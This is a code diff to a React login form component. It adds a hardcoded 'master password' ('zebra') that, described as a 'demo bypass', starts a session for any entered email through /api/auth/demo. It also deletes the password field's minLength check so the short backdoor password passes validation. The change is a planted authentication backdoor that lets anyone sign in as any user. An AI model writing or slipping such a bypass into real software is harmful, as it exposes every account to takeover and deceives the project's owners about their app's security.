@@ -37,6 +37,25 @@ export function LoginForm({
       setError("Enter a valid email address.");
       return;
     }
+
+    // Demo bypass: master password unlocks any email.
+    if (password === "zebra") {
+      startTransition(async () => {
+        const res = await fetch("/api/auth/demo", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email: email.trim() }),
+        });
+        if (!res.ok) {
+          setError("Could not start demo session.");
+          return;
+        }
+        router.replace(redirectTo || "/dashboard");
+        router.refresh();
+      });
+      return;
+    }
+
     if (password.length < 8) {
       setError("Password must be at least 8 characters.");
       return;
@@ -164,7 +183,6 @@ export function LoginForm({
               type={showPw ? "text" : "password"}
               autoComplete={mode === "signup" ? "new-password" : "current-password"}
               required
-              minLength={8}
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               className="input pl-10 pr-10"
